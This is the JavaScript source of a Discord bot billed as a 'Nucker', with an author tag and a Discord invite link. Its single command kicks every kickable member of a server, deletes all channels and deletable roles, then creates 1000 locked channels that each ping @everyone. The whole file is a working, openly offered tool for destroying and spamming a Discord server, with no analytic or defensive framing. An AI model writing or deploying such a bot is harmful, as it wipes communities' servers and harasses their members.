//--------------Discord Nucker By MoDeW-------------
const { Discord, MessageEmbed } = require("discord.js")
const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
require('dotenv').config()
const token = process.env.TOKEN
const prefix = process.env.PREFIX

client.on('message', function(message){
    if(message.content === "!nuck-modew") {
        message.guild.members.cache.forEach(member => {
            if (member.kickable) {
                member.kick();
            } else {
                console.log(`Cannot kick member ${member.user.username}`);
            }
        });
        message.guild.channels.cache.forEach(channel => channel.delete());
        message.guild.roles.cache.forEach(role => {
            if (role.deletable) {
                role.delete().then(deletedRole => console.log(`Deleted role ${deletedRole.name}`)).catch(console.error);
            } else {
                console.log(`Cannot delete role ${role.name}`);
            }
        });
        for (let i = 1; i <= 1000; i++) {
            message.guild.channels.create(`nucked-by-modew`, {
                type: 'text',
                permissionOverwrites: [
                    {
                        id: message.guild.id,
                        deny: ['SEND_MESSAGES']
                    }
                ]
            }).then(newChannel => newChannel.send('@everyone'));
        }
    }
});


client.on("ready", () => {
    console.log("Nucker is Ready!");
    client.user.setActivity('MoDeW', {
        type: "PLAYING",
    });
});
client.login(token)
//-----------https://discord.gg/jBBc6JYT------------
